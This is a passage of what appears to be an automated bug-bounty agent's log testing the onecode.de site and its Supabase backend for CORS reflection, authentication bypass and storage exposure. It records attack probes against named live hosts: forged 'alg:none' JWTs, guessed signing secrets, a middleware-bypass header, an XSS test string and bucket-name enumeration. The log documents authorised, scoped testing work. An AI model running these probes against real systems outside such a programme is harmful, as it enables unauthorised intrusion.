+verify_steps: 1) DONE — `curl -D- -H 'Origin: https://evil.example' -H 'apikey: <pub>' -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NSJ9.' 'https://aygnpacdkgtsfnhgcyjc.supabase.co/rest/v1/profiles?select=*'` → 401 `{"code":"PGRST301",…}`, `access-control-allow-origin: https://evil.example`, `vary: Accept-Encoding`, `cf-cache-status: DYNAMIC`. 2) DONE — control on the other plane: same `Origin` + apikey on `/auth/v1/settings` → 200, `vary: Origin, Accept-Encoding`. Same host, same `Origin`, different `Vary`. 3) DONE — the no-auth path `GET /rest/v1/` with the same `Origin` → 401 `Secret API key required` with `ACAO: *`, i.e. no reflection and no `Vary` to omit; the defect is confined to the reflection path. 4) NOT DONE and not attempted: populating a cache, which requires a write or a cache-affecting request outside passive scope.
+impact: LOW now, MEDIUM latent. No cacheable response currently exists on this plane — the schema-cache anon-block (`503 PGRST002`) and the `401 Secret API key required` and `401 PGRST301` paths are all uncacheable — so there is no live amplifier and nothing is disclosed today. Reported for the remediation implication and because a future permissive RLS state or a CDN rule converts it into a cross-origin data read without any further code change.
+testability: PASSIVE
+
+=== STEP 4 — SELF-CRITIQUE ===
+Dropped this cycle: nothing on confidence grounds — no hypothesis entered below 40.
+[PARKED] S3 SigV4 plane (`aygnpacdkgtsfnhgcyjc.storage.supabase.co/storage/v1/s3`): held at 40, not raised. `GET /storage/v1/s3` → 403 `AccessDenied/Missing signature`, `ACAO: *`; the publishable key as `Bearer`+`apikey` still yields `403 Missing signature`, so the public key that authorises every other plane does not authorise this one. The entire key-exists half is unproven, and Supabase serves this endpoint for every project whether or not keys were created. Only an owner-side dashboard check resolves it; enumeration of key IDs is the program's rate-limit/credential class and will not be attempted.
+[PARKED] Post-auth BOLA via a Supabase RLS gap (conf 65, the program's theoretical maximum): parked on execution cost, not on doubt. Every cheap route to a second `authenticated` principal is now measured closed — `external.anonymous_users:false`, `disable_signup:true`, `mailer_autoconfirm:false`; `GET /rest/v1/` with `Accept: application/openapi+json` → 401 `Secret API key required`, so table names cannot be enumerated; `/auth/v1/admin/users` and `/auth/v1/admin/generate_link` → 401; 4 candidate HS256 secrets × 2 endpoints → 403/401; `alg:none` → 403 `bad_jwt`. Two invited accounts are the only non-intrusive path and they are unavailable.
+[PARKED] cto.onecode.de subdomain takeover (conf 58): retained unchanged, not advanced. CNAME `cname.perspective-dns.com.` and HTTP 409 have now been stable 50 days and every additional day of passive probing returns the same three facts. An owner's claim attempt is the only proof; I will not re-dig it on a time cadence.
+[PARKED] Bucket-existence enumeration: 68 names excluded, control `zzz_control_absent_9x7` byte-identical every time. Stopping here rather than continuing to spend requests on a guessable-name search — the name is not in any pre-auth artifact (13 chunks, zero application `.from("…")`/`getPublicUrl`/`storage/v1/*` literals), so more guessing has no information gain.
+[FINAL] 1. Supabase gateway: no origin allowlist + apikey accepted as a query-string parameter → preflight-free, `null`-origin cross-origin read of the GoTrue identity plane (CWE-942). conf 78, PASSIVE, MEDIUM as measured / HIGH as a configuration defect. This is the only survivor this cycle that is both fully testable now and not already known.
+[FINAL] 2. Forced-login via URL-fragment session injection on the pre-auth `/login` page. conf 55, AUTH_HELPED, MEDIUM. Highest-impact lead in the program that needs nothing but two invited accounts; the sink, its mount point, its hash and its three impact caps are all established.
+[FINAL] 3. PostgREST reflects `Origin` without `vary: Origin`. conf 50, PASSIVE, LOW now / MEDIUM latent. Reported for remediation, not for impact.
+
+=== STEP 5 — NEXT ACTION ===
+[NEXT] HUMAN: the AUTH_HELPED unblock is now the binding constraint on this program and no amount of further probing changes that. Request two invited OneCode course accounts on distinct email addresses from bugs.olivermaicher.eu, stating that account A's own token pair is the only credential needed and that no customer data will be touched, only account A's own. Until they arrive, lead 1 is the only one that can be advanced and its remaining step is a browser PoC, which a header-reading client cannot produce.
+
+=== STEP 6 — LEARNING ===
+[LEARN] ACCEPTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/*: the credentialed Origin reflection is reachable via the apikey **query string** (`?apikey=sb_publishable_…`), which makes it a simple request — no CORS preflight, no attacker-set header — and `Origin: null` is reflected with `ACAC: true`, so no attacker-controlled domain is required at all. A `data:` document or a sandboxed `srcdoc` iframe suffices. Corrects my own earlier framing that the reflection was "gated on a valid apikey": apikey is a public value and gating on it is not a boundary.
+[LEARN] ACCEPTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/rest/v1/*: the `vary: Origin` omission is measured on a live reflected response, not inferred. `GET /rest/v1/profiles?select=*` with a foreign `Origin` → `ACAO: https://evil.example` with `vary: Accept-Encoding`; the same `Origin` on GoTrue → `vary: Origin, Accept-Encoding`. Amplifier still absent (`cf-cache-status: DYNAMIC`), so held at 50, not inflated.
+[LEARN] ACCEPTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co: the storage bucket-existence oracle is now 68 names deep and still clean, including project-ref-derived and German course-platform semantics. The control `zzz_control_absent_9x7` returns byte-identical `400 {"code":"NoSuchBucket"}` to every candidate. Enumeration stopped here on information grounds: the bucket name is not present in any of the 13 pre-auth chunks.
+[LEARN] REJECTED MISCONFIG @ kurs.onecode.de: no deploy, day-11. `0-mbmp1iqb6hj.js` = 154 581 B sha256 `f916f314ea61a8c58a055707fc63c251f38e8412ae7a08e6abd7500ec375abca`; sink chunk `1a4tqdnsy9k1l.js` = 13 880 B sha256 `5a72d2cd8738ecadfd9ef271f062b3f2ba799617dabddf32987c2883c6dcedd0`; 13 chunk refs stable; `GET /login` 200, `private, no-cache, no-store`, no `Set-Cookie`. Build-diffing stays event-triggered — a time cadence here costs requests and returns the same hash.
+[LEARN] REJECTED MISCONFIG @ cto.onecode.de: CNAME `cname.perspective-dns.com.` + HTTP 409 at day-50, zero verification TXT. Passive probing of this asset is fully converged; only the owner's claim attempt advances it.
+[LEARN] REJECTED AUTH @ kurs.onecode.de: no cheap route to the second `authenticated` principal the RLS hypothesis needs. `/auth/v1/settings` → `external.anonymous_users:false`, `disable_signup:true`, `mailer_autoconfirm:false`, sole true provider `external.email`; PostgREST schema disclosure blocked at `401 Secret API key required`; GoTrue admin plane 401 on both `/auth/v1/admin/users` and `/auth/v1/admin/generate_link`; 4 candidate HS256 secrets × 2 endpoints → 403/401; `alg:none` → 403 `bad_jwt`. Two invited accounts remain the only non-intrusive path.
+[LEARN] REJECTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/storage/v1/*: 68 candidate bucket names excluded via the oracle (22 this cycle, incl. `aygnpacdkgtsfnhgcyjc`, `kurs`, `materialien`, `lektionen`, `videos`, `avatars`). No bucket found; the public-download plane stays closed.
+[LEARN] REJECTED OATH @ aygnpacdkgtsfnhgcyjc.supabase.co: GoTrue `/auth/v1/authorize?provider=github&redirect_to=https://evil.example/` → 400 `Unsupported provider`, no `Location`; `/auth/v1/logout?returnTo=` → 405 `Allow: POST`; the `redirect_to` allowlist is exact-origin across 8 off-origin variants. No redirect primitive, consistent with `external.email` being the only true provider.
+[LEARN] REJECTED AUTH @ kurs.onecode.de: forged/null session cookies (5 variants), `x-middleware-subrequest` (CVE-2025-29927), `_next/image` external fetch, 10 path-normalisation variants, 4 header-desync variants, and `?error=<script>alert(1)</script>` (zero bytes reflected, `linkError:null`) — all re-negative. The middleware gate and the pre-auth surface are unchanged at `{/login,/passwort-vergessen,/datenschutz,/rechtliches}` 200.
+
+=== STEP 7 — RISK ===
+[RISK] onecode: 47 — flat. One point of scope, not of access. The CORS finding is a genuine cross-origin read of the identity plane that any web origin can perform with no preflight and no attacker domain, and it is the only novel, fully testable result this cycle. But the impact ceiling did not move: the only cookie on the Supabase origin is `__cf_bm`, the app session cookie lives on `kurs.onecode.de` which is CORS-clean, PostgREST refuses the publishable key with `401 Secret API key required`, and JWT signature verification is sound against `alg:none` and 4 candidate secrets. No user data is readable cross-origin, so the score does not rise. Downward pressure is structural: the pre-auth surface has been exhausted for 47 days, the sole high-impact lead needs two invited accounts the program has not issued, the only remaining sub-domain item needs the owner to attempt a claim, and the S3 plane needs a dashboard answer. The next score movement in either direction is gated on a human, not on a probe.
+```
